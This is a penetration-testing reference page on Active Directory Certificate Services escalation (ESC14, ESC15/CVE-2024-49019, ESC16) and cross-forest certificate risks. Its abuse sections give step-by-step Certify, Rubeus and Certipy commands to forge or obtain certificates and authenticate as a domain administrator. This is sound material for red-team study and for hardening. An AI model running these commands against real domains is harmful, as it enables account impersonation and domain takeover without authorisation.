# AD CS Domain Escalation - ESC14 to ESC16 and FORESTS

## Vulnerable Certificate Renewal Configuration- ESC14



### Explanation

The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. Below is a quotation of the original text.

ESC14 addresses vulnerabilities arising from "weak explicit certificate mapping", primarily through the misuse or insecure configuration of the `altSecurityIdentities` attribute on Active Directory user or computer accounts. This multi-valued attribute allows administrators to manually associate X.509 certificates with an AD account for authentication purposes. When populated, these explicit mappings can override the default certificate mapping logic, which typically relies on UPNs or DNS names in the SAN of the certificate, or the SID embedded in the `szOID_NTDS_CA_SECURITY_EXT` security extension.

A "weak" mapping occurs when the string value used within the `altSecurityIdentities` attribute to identify a certificate is too broad, easily guessable, relies on non-unique certificate fields, or uses easily spoofable certificate components. If an attacker can obtain or craft a certificate whose attributes match such a weakly defined explicit mapping for a privileged account, they can use that certificate to authenticate as and impersonate that account.

Examples of potentially weak `altSecurityIdentities` mapping strings include:

- Mapping solely by a common Subject Common Name (CN): e.g., `X509:<S>CN=SomeUser`. An attacker might be able to obtain a certificate with this CN from a less secure source.
- Using overly generic Issuer Distinguished Names (DNs) or Subject DNs without further qualification like a specific serial number or subject key identifier: e.g., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Employing other predictable patterns or non-cryptographic identifiers that an attacker might be able to satisfy in a certificate they can legitimately obtain or forge (if they have compromised a CA or found a vulnerable template like in ESC1).

The `altSecurityIdentities` attribute supports various formats for mapping, such as:

- `X509:<I>IssuerDN<S>SubjectDN` (maps by full Issuer and Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (maps by the certificate's Subject Key Identifier extension value)
- `X509:<SR>SerialNumberBackedByIssuerDN` (maps by serial number, implicitly qualified by the Issuer DN) - this is not a standard format, usually it's `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (maps by an RFC822 name, typically an email address, from the SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (maps by a SHA1 hash of the certificate's raw public key - generally strong)

The security of these mappings depends heavily on the specificity, uniqueness, and cryptographic strength of the chosen certificate identifiers used in the mapping string. Even with strong certificate binding modes enabled on Domain Controllers (which primarily affect implicit mappings based on SAN UPNs/DNS and the SID extension), a poorly configured `altSecurityIdentities` entry can still present a direct path for impersonation if the mapping logic itself is flawed or too permissive.
### Abuse Scenario

ESC14 targets **explicit certificate mappings** in Active Directory (AD), specifically the `altSecurityIdentities` attribute. If this attribute is set (by design or misconfiguration), attackers can impersonate accounts by presenting certificates that match the mapping.

#### Scenario A: Attacker Can Write to `altSecurityIdentities`

 **Precondition**: Attacker has write permissions to the target account’s `altSecurityIdentities` attribute or the permission to grant it in the form of one of the following permissions on the target AD object:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)

- **Precondition**: The target has a weak X509RFC822 mapping in altSecurityIdentities. An attacker can set the victim's mail attribute to match the target's X509RFC822 name, enroll a certificate as the victim, and use it to authenticate as the target.
#### Scenario C: Target Has X509IssuerSubject Mapping

- **Precondition**: The target has a weak X509IssuerSubject explicit mapping in `altSecurityIdentities`.The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509IssuerSubject mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
#### Scenario D: Target Has X509SubjectOnly Mapping

- **Precondition**: The target has a weak X509SubjectOnly explicit mapping in `altSecurityIdentities`. The attacker can set the `cn` or `dNSHostName` attribute on a victim principal to match the subject of the target’s X509SubjectOnly mapping. Then, the attacker can enroll a certificate as the victim, and use this certificate to authenticate as the target.
### concrete operations
#### Scenario A

Request a certificate of the certificate template `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Save and convert the certificate

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Authenticate (using the certificate)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Cleanup (optional)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

For more specific attack methods in various attack scenarios, please refer to the following: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).



## EKUwu Application Policies(CVE-2024-49019) - ESC15



### Explanation

The description at https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc is remarkably thorough. Below is a quotation of the original text.

Using built-in default version 1 certificate templates, an attacker can craft a CSR to include application policies that are preferred over the configured Extended Key Usage attributes specified in the template. The only requirement is enrollment rights, and it can be used to generate client authentication, certificate request agent, and codesigning certificates using the **_WebServer_** template

### Abuse

The following is referenced to [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Click to see more detailed usage methods.

Certipy's `find` command can help identify V1 templates that are potentially susceptible to ESC15 if the CA is unpatched.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Scenario A: Direct Impersonation via Schannel

**Step 1: Request a certificate, injecting "Client Authentication" Application Policy and target UPN.** Attacker `attacker@corp.local` targets `administrator@corp.local` using the "WebServer" V1 template (which allows enrollee-supplied subject).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: The vulnerable V1 template with "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Injects the OID `1.3.6.1.5.5.7.3.2` into the Application Policies extension of the CSR.
- `-upn 'administrator@corp.local'`: Sets the UPN in the SAN for impersonation.

**Step 2: Authenticate via Schannel (LDAPS) using the obtained certificate.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Step 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** This certificate is for the attacker (`attacker@corp.local`) to become an enrollment agent. No UPN is specified for the attacker's own identity here, as the goal is the agent capability.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Step 2: Use the "agent" certificate to request a certificate on behalf of a target privileged user.** This is an ESC3-like step, using the certificate from Step 1 as the agent certificate.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Step 3: Authenticate as the privileged user using the "on-behalf-of" certificate.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```



## Security Extension Disabled on CA (Globally)-ESC16



### Explanation

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** refers to the scenario where, if the configuration of AD CS does not enforce the inclusion of the **szOID_NTDS_CA_SECURITY_EXT** extension in all certificates, an attacker can exploit this by:

1. Requesting a certificate **without SID binding**.
    
2. Using this certificate **for authentication as any account**, such as impersonating a high-privilege account (e.g., a Domain Administrator).

You can also refer to this article to learn more about the detailed principle:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

The following is referenced to [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally),Click to see more detailed usage methods.

To identify whether the Active Directory Certificate Services (AD CS) environment is vulnerable to **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Step 1: Read initial UPN of the victim account (Optional - for restoration).  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Step 2: Update the victim account's UPN to the target administrator's `sAMAccountName`.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Step 4: Request a certificate as the "victim" user from _any suitable client authentication template_ (e.g., "User") on the ESC16-vulnerable CA.** Because the CA is vulnerable to ESC16, it will automatically omit the SID security extension from the issued certificate, regardless of the template's specific settings for this extension. Set the Kerberos credential cache environment variable (shell command):

```bash
export KRB5CCNAME=victim.ccache
```

Then request the certificate:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Step 5: Revert the "victim" account's UPN.**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Step 6: Authenticate as the target administrator.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

# AD CS Domain Escalation - ESC14 to ESC16 and FORESTS


## Compromising Forests with Certificates Explained in Passive Voice



### Breaking of Forest Trusts by Compromised CAs

The configuration for **cross-forest enrollment** is made relatively straightforward. The **root CA certificate** from the resource forest is **published to the account forests** by administrators, and the **enterprise CA** certificates from the resource forest are **added to the `NTAuthCertificates` and AIA containers in each account forest**. To clarify, this arrangement grants the **CA in the resource forest complete control** over all other forests for which it manages PKI. Should this CA be **compromised by attackers**, certificates for all users in both the resource and account forests could be **forged by them**, thereby breaking the security boundary of the forest.

### Enrollment Privileges Granted to Foreign Principals

In multi-forest environments, caution is required concerning Enterprise CAs that **publish certificate templates** which allow **Authenticated Users or foreign principals** (users/groups external to the forest to which the Enterprise CA belongs) **enrollment and edit rights**.\
Upon authentication across a trust, the **Authenticated Users SID** is added to the user’s token by AD. Thus, if a domain possesses an Enterprise CA with a template that **allows Authenticated Users enrollment rights**, a template could potentially be **enrolled in by a user from a different forest**. Likewise, if **enrollment rights are explicitly granted to a foreign principal by a template**, a **cross-forest access-control relationship is thereby created**, enabling a principal from one forest to **enroll in a template from another forest**.

Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.



## References



- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

# AD CS Domain Escalation - ESC4 to ESC5 ACCESS CONTROL
